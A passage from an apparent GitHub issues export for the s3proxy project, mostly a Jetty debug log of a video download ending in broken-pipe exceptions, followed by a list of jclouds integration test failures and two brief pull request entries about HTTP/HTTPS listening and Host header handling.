15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.ChannelEndPoint - flushed 32768 SelectChannelEndPoint@4465ed37{/127.0.0.1:48839<->9090,Open,in,out,-,W,0/30000,HttpConnection}{io=0,kio=0,kro=1}
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@18916c5b{IDLE}:WRITING-->IDLE
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.e.jetty.server.HttpConnection - org.eclipse.jetty.server.HttpConnection$SendCallback@56cd6ef[PROCESSING][i=null,cb=Blocker@69df07da{null}] generate: DONE (null,[p=32768,l=32768,c=32768,r=0],false)@COMMITTED
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.e.jetty.server.HttpConnection - org.eclipse.jetty.server.HttpConnection$SendCallback@56cd6ef[PROCESSING][i=null,cb=Blocker@69df07da{null}] generate: FLUSH (null,[p=0,l=32768,c=32768,r=32768],false)@COMMITTED
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - write: WriteFlusher@18916c5b{IDLE} [HeapByteBuffer@3fb28ad9[p=0,l=32768,c=32768,r=32768]={<<<\x17\x88\x8eC\xA4C\xC5\x85\xB3\x88\x1a\xA5\xB4\xDft0\xAb...\xDd\xA5\xFd\xC1\xC9\xEb\x0b\xD7\xB9\x0f\xF3\xD329I>>>}]
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@18916c5b{WRITING}:IDLE-->WRITING
15:26:13.819 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.ChannelEndPoint - flushed 32768 SelectChannelEndPoint@4465ed37{/127.0.0.1:48839<->9090,Open,in,out,-,W,0/30000,HttpConnection}{io=0,kio=0,kro=1}
15:26:13.820 [qtp2032647583-21 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@18916c5b{IDLE}:WRITING-->IDLE

...
... more than 4000 lines with the same trace
...

15:26:14.851 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - write: WriteFlusher@1703ec5e{IDLE} [HeapByteBuffer@3fb28ad9[p=0,l=32768,c=32768,r=32768]={<<<T\xEe\x07T\xE9e\x8e\xBce\x0f\x18Oa~\xBa}\xB1...\xEa\xFb\x08\xF3e\xE1ydDe?\xC9\x04\xF4\xD6>>>}]
15:26:14.851 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@1703ec5e{WRITING}:IDLE-->WRITING
15:26:14.851 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.ChannelEndPoint - flushed 32768 SelectChannelEndPoint@4d0efa12{/127.0.0.1:48843<->9090,Open,in,out,-,W,0/30000,HttpConnection}{io=0,kio=0,kro=1}
15:26:14.851 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@1703ec5e{IDLE}:WRITING-->IDLE
15:26:14.851 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.e.jetty.server.HttpConnection - org.eclipse.jetty.server.HttpConnection$SendCallback@60b9d7b1[PROCESSING][i=null,cb=Blocker@35eea7f5{null}] generate: DONE (null,[p=32768,l=32768,c=32768,r=0],false)@COMMITTED
15:26:14.851 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.e.jetty.server.HttpConnection - org.eclipse.jetty.server.HttpConnection$SendCallback@60b9d7b1[PROCESSING][i=null,cb=Blocker@35eea7f5{null}] generate: FLUSH (null,[p=0,l=32768,c=32768,r=32768],false)@COMMITTED
15:26:14.851 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - write: WriteFlusher@1703ec5e{IDLE} [HeapByteBuffer@3fb28ad9[p=0,l=32768,c=32768,r=32768]={<<<JI\x87\x1a\xF5\xDa8\xD5e\xF0\xEem\xFd\xC12\xEc...\x9b\xEf\xA9H\xF6\xD6*\xB0~\xD7R]1-\x1b>>>}]
15:26:14.851 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@1703ec5e{WRITING}:IDLE-->WRITING
15:26:14.853 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - write exception
org.eclipse.jetty.io.EofException: null
    at org.eclipse.jetty.io.ChannelEndPoint.flush(ChannelEndPoint.java:192) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.WriteFlusher.flush(WriteFlusher.java:408) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.WriteFlusher.write(WriteFlusher.java:302) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.AbstractEndPoint.write(AbstractEndPoint.java:129) [jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection$SendCallback.process(HttpConnection.java:690) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.IteratingCallback.processing(IteratingCallback.java:246) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.IteratingCallback.iterate(IteratingCallback.java:208) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection.send(HttpConnection.java:480) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.sendResponse(HttpChannel.java:768) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.write(HttpChannel.java:801) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.write(HttpOutput.java:147) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.write(HttpOutput.java:140) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.write(HttpOutput.java:355) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at com.google.common.io.ByteStreams.copy(ByteStreams.java:179) [guava-16.0.1.jar:na]
    at org.gaul.s3proxy.S3ProxyHandler.handleGetBlob(S3ProxyHandler.java:979) [classes/:na]
    at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:392) [classes/:na]
    at org.gaul.s3proxy.S3ProxyHandler.handle(S3ProxyHandler.java:201) [classes/:na]
    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.Server.handle(Server.java:499) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540) [jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at java.lang.Thread.run(Thread.java:745) [na:1.8.0_45-internal]
Caused by: java.io.IOException: Broken pipe
    at sun.nio.ch.FileDispatcherImpl.write0(Native Method) ~[na:1.8.0_45-internal]
    at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:47) ~[na:1.8.0_45-internal]
    at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93) ~[na:1.8.0_45-internal]
    at sun.nio.ch.IOUtil.write(IOUtil.java:65) ~[na:1.8.0_45-internal]
    at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471) ~[na:1.8.0_45-internal]
    at org.eclipse.jetty.io.ChannelEndPoint.flush(ChannelEndPoint.java:170) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    ... 24 common frames omitted
15:26:14.853 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@1703ec5e{IDLE}:WRITING-->IDLE
15:26:14.853 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.e.jetty.server.HttpConnection - org.eclipse.jetty.server.HttpConnection$SendCallback@60b9d7b1[PROCESSING][i=null,cb=Blocker@35eea7f5{null}] generate: FLUSH (null,[p=0,l=32768,c=32768,r=32768],true)@COMPLETING
15:26:14.853 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - write: WriteFlusher@1703ec5e{IDLE} [HeapByteBuffer@3fb28ad9[p=0,l=32768,c=32768,r=32768]={<<<JI\x87\x1a\xF5\xDa8\xD5e\xF0\xEem\xFd\xC12\xEc...\x9b\xEf\xA9H\xF6\xD6*\xB0~\xD7R]1-\x1b>>>}]
15:26:14.853 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@1703ec5e{WRITING}:IDLE-->WRITING
15:26:14.853 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - write exception
org.eclipse.jetty.io.EofException: null
    at org.eclipse.jetty.io.ChannelEndPoint.flush(ChannelEndPoint.java:192) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.WriteFlusher.flush(WriteFlusher.java:408) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.WriteFlusher.write(WriteFlusher.java:302) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.AbstractEndPoint.write(AbstractEndPoint.java:129) [jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection$SendCallback.process(HttpConnection.java:690) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.IteratingCallback.processing(IteratingCallback.java:246) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.IteratingCallback.iterate(IteratingCallback.java:208) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection.send(HttpConnection.java:480) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.sendResponse(HttpChannel.java:768) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.write(HttpChannel.java:801) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.write(HttpOutput.java:147) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.write(HttpOutput.java:140) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.close(HttpOutput.java:171) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.gaul.s3proxy.S3ProxyHandler.handleGetBlob(S3ProxyHandler.java:981) [classes/:na]
    at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:392) [classes/:na]
    at org.gaul.s3proxy.S3ProxyHandler.handle(S3ProxyHandler.java:201) [classes/:na]
    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.Server.handle(Server.java:499) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540) [jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at java.lang.Thread.run(Thread.java:745) [na:1.8.0_45-internal]
Caused by: java.io.IOException: Broken pipe
    at sun.nio.ch.FileDispatcherImpl.write0(Native Method) ~[na:1.8.0_45-internal]
    at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:47) ~[na:1.8.0_45-internal]
    at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93) ~[na:1.8.0_45-internal]
    at sun.nio.ch.IOUtil.write(IOUtil.java:65) ~[na:1.8.0_45-internal]
    at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471) ~[na:1.8.0_45-internal]
    at org.eclipse.jetty.io.ChannelEndPoint.flush(ChannelEndPoint.java:170) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    ... 23 common frames omitted
15:26:14.853 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.WriteFlusher - update WriteFlusher@1703ec5e{IDLE}:WRITING-->IDLE
15:26:14.854 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.server.HttpOutput - 
org.eclipse.jetty.io.EofException: null
    at org.eclipse.jetty.io.ChannelEndPoint.flush(ChannelEndPoint.java:192) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.WriteFlusher.flush(WriteFlusher.java:408) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.WriteFlusher.write(WriteFlusher.java:302) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.AbstractEndPoint.write(AbstractEndPoint.java:129) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection$SendCallback.process(HttpConnection.java:690) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.IteratingCallback.processing(IteratingCallback.java:246) ~[jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.IteratingCallback.iterate(IteratingCallback.java:208) ~[jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection.send(HttpConnection.java:480) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.sendResponse(HttpChannel.java:768) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.write(HttpChannel.java:801) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.write(HttpOutput.java:147) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.write(HttpOutput.java:140) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.close(HttpOutput.java:171) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.gaul.s3proxy.S3ProxyHandler.handleGetBlob(S3ProxyHandler.java:981) [classes/:na]
    at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:392) [classes/:na]
    at org.gaul.s3proxy.S3ProxyHandler.handle(S3ProxyHandler.java:201) [classes/:na]
    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.Server.handle(Server.java:499) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540) [jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at java.lang.Thread.run(Thread.java:745) [na:1.8.0_45-internal]
Caused by: java.io.IOException: Broken pipe
    at sun.nio.ch.FileDispatcherImpl.write0(Native Method) ~[na:1.8.0_45-internal]
    at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:47) ~[na:1.8.0_45-internal]
    at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93) ~[na:1.8.0_45-internal]
    at sun.nio.ch.IOUtil.write(IOUtil.java:65) ~[na:1.8.0_45-internal]
    at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471) ~[na:1.8.0_45-internal]
    at org.eclipse.jetty.io.ChannelEndPoint.flush(ChannelEndPoint.java:170) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    ... 23 common frames omitted
15:26:14.854 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.eclipse.jetty.io.AbstractEndPoint - onClose SelectChannelEndPoint@4d0efa12{/127.0.0.1:48843<->9090,CLOSED,in,out,-,-,3/30000,HttpConnection}{io=0,kio=0,kro=1}
15:26:14.854 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.ChannelEndPoint - close SelectChannelEndPoint@4d0efa12{/127.0.0.1:48843<->9090,CLOSED,in,out,-,-,3/30000,HttpConnection}{io=0,kio=0,kro=1}
15:26:14.854 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.io.SelectorManager - Destroyed SelectChannelEndPoint@4d0efa12{/127.0.0.1:48843<->9090,CLOSED,ISHUT,OSHUT,-,-,3/30000,HttpConnection}{io=0,kio=-1,kro=-1}
15:26:14.854 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.e.jetty.io.AbstractConnection - onClose HttpConnection@711dd5b5{FILLING}
15:26:14.854 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.eclipse.jetty.io.AbstractEndPoint - onClose SelectChannelEndPoint@4d0efa12{/127.0.0.1:48843<->9090,CLOSED,ISHUT,OSHUT,-,-,3/30000,HttpConnection}{io=0,kio=-1,kro=-1}
15:26:14.854 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.server.HttpChannel - 
org.eclipse.jetty.io.EofException: null
    at org.eclipse.jetty.io.ChannelEndPoint.flush(ChannelEndPoint.java:192) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.WriteFlusher.flush(WriteFlusher.java:408) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.WriteFlusher.write(WriteFlusher.java:302) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.AbstractEndPoint.write(AbstractEndPoint.java:129) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection$SendCallback.process(HttpConnection.java:690) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.IteratingCallback.processing(IteratingCallback.java:246) ~[jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.IteratingCallback.iterate(IteratingCallback.java:208) ~[jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection.send(HttpConnection.java:480) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.sendResponse(HttpChannel.java:768) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.write(HttpChannel.java:801) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.write(HttpOutput.java:147) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.write(HttpOutput.java:140) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpOutput.write(HttpOutput.java:355) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at com.google.common.io.ByteStreams.copy(ByteStreams.java:179) ~[guava-16.0.1.jar:na]
    at org.gaul.s3proxy.S3ProxyHandler.handleGetBlob(S3ProxyHandler.java:979) ~[classes/:na]
    at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:392) ~[classes/:na]
    at org.gaul.s3proxy.S3ProxyHandler.handle(S3ProxyHandler.java:201) ~[classes/:na]
    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.Server.handle(Server.java:499) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310) ~[jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257) [jetty-server-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540) [jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555) [jetty-util-9.2.11.v20150529.jar:9.2.11.v20150529]
    at java.lang.Thread.run(Thread.java:745) [na:1.8.0_45-internal]
Caused by: java.io.IOException: Broken pipe
    at sun.nio.ch.FileDispatcherImpl.write0(Native Method) ~[na:1.8.0_45-internal]
    at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:47) ~[na:1.8.0_45-internal]
    at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93) ~[na:1.8.0_45-internal]
    at sun.nio.ch.IOUtil.write(IOUtil.java:65) ~[na:1.8.0_45-internal]
    at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471) ~[na:1.8.0_45-internal]
    at org.eclipse.jetty.io.ChannelEndPoint.flush(ChannelEndPoint.java:170) ~[jetty-io-9.2.11.v20150529.jar:9.2.11.v20150529]
    ... 24 common frames omitted
15:26:14.854 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG o.e.jetty.server.HttpChannelState - HttpChannelState@50db53b7{s=DISPATCHED i=true a=null} unhandle DISPATCHED
15:26:14.854 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.http.HttpParser - close HttpParser{s=END,0 of 0}
15:26:14.854 [qtp2032647583-18 - /videos/6015_2018_2035.h264.cutted.mp4] DEBUG org.eclipse.jetty.http.HttpParser - END --> CLOSED
15:26:14.854 [qtp2032647583-18] DEBUG org.eclipse.jetty.server.HttpChannel - HttpChannelOverHttp@3f99f0a6{r=1,c=false,a=IDLE,uri=-} handle exit, result COMPLETE
15:26:14.854 [qtp2032647583-18] DEBUG org.eclipse.jetty.http.HttpParser - atEOF HttpParser{s=CLOSED,0 of 0}
15:26:14.854 [qtp2032647583-18] DEBUG org.eclipse.jetty.http.HttpParser - parseNext s=CLOSED HeapByteBuffer@40635532[p=0,l=0,c=0,r=0]={<<<>>>}
15:26:14.854 [qtp2032647583-18] DEBUG o.e.jetty.io.AbstractConnection - FILLING-->IDLE HttpConnection@711dd5b5{IDLE}
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/63/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/63/comments,https://api.github.com/repos/gaul/s3proxy/issues/63/events,https://github.com/gaul/s3proxy/issues/63,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/62,87926735,MDU6SXNzdWU4NzkyNjczNQ==,62,jclouds integration test failures,848247,closed,FALSE,NA,NA,1,2015-06-13T04:28:48Z,2016-01-13T00:39:21Z,2016-01-13T00:39:21Z,OWNER,NA,"We have several remaining failures:

```
  BucketsLiveTest.testBucketLogging:214 » AWSResponse request GET http://localho...
  BucketsLiveTest.testBucketPayer:183 » AWSResponse request GET http://localhost...
  BucketsLiveTest.testUpdateBucketACL:127->checkGrants:137 AccessControlList{owner=org.jclouds.s3.domain.CanonicalUser@52bd459b, grants=[Grant{grantee=CanonicalUserGrantee{displayName='CustomersName@amazon.com', identifier='75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a'}, permission=FULL_CONTROL}]} expected [4] but found [1]
  S3ClientLiveTest.testCopyCannedAccessPolicyPublic:145 » UnknownHost gaul-blobs...
  S3ClientLiveTest.testCopyIfMatch:442 » AWSResponse request PUT http://localhos...
  S3ClientLiveTest.testCopyIfModifiedSince:389 » AWSResponse request PUT http://...
  S3ClientLiveTest.testCopyIfNoneMatch:464 » AWSResponse request PUT http://loca...
  S3ClientLiveTest.testCopyIfUnmodifiedSince:419 » AWSResponse request PUT http:...
  S3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testPutFileParallel:153 » Timeout
  S3BlobIntegrationLiveTest>BaseBlobIntegrationTest.testSetBlobAccess:668
Expecting:
 <PRIVATE>
to be equal to:
 <PUBLIC_READ>
but was not.
  S3ContainerIntegrationLiveTest>BaseContainerIntegrationTest.testSetContainerAccess:511
Expecting:
 <PRIVATE>
to be equal to:
 <PUBLIC_READ>
but was not.
  S3ClientLiveTest.testMetadataWithCacheControlAndContentDisposition:319->assertCacheControl:328 NullPointer
  S3ClientLiveTest.testPublicWriteOnObject:165 » AWSResponse request PUT http://...
  S3ClientLiveTest.testPutCannedAccessPolicyPublic:125 » UnknownHost gaul-blobst...
  S3ClientLiveTest.testUpdateObjectACL:212->checkGrants:576 AccessControlList{owner=org.jclouds.s3.domain.CanonicalUser@52bd459b, grants=[Grant{grantee=CanonicalUserGrantee{displayName='CustomersName@amazon.com', identifier='75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a'}, permission=FULL_CONTROL}]} expected [4] but found [1]

Tests run: 120, Failures: 15, Errors: 0, Skipped: 6
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/62/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/62/comments,https://api.github.com/repos/gaul/s3proxy/issues/62/events,https://github.com/gaul/s3proxy/issues/62,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/61,75415505,MDExOlB1bGxSZXF1ZXN0MzUxODU1NDk=,61,add a way to listen to both http and https,1772540,closed,FALSE,NA,NA,4,2015-05-12T01:20:11Z,2015-05-14T00:46:49Z,2015-05-14T00:46:49Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/61/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/61/comments,https://api.github.com/repos/gaul/s3proxy/issues/61/events,https://github.com/gaul/s3proxy/pull/61,https://api.github.com/repos/gaul/s3proxy/pulls/61
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/60,75410623,MDExOlB1bGxSZXF1ZXN0MzUxODQ1MjE=,60,correctly follow the host header documentation,1772540,closed,FALSE,NA,NA,1,2015-05-12T00:55:08Z,2015-05-13T01:31:16Z,2015-05-13T01:31:05Z,COLLABORATOR,NA,"https://docs.aws.amazon.com/AmazonS3/latest/dev/VirtualHosting.html#VirtualHostingSpecifyBucket
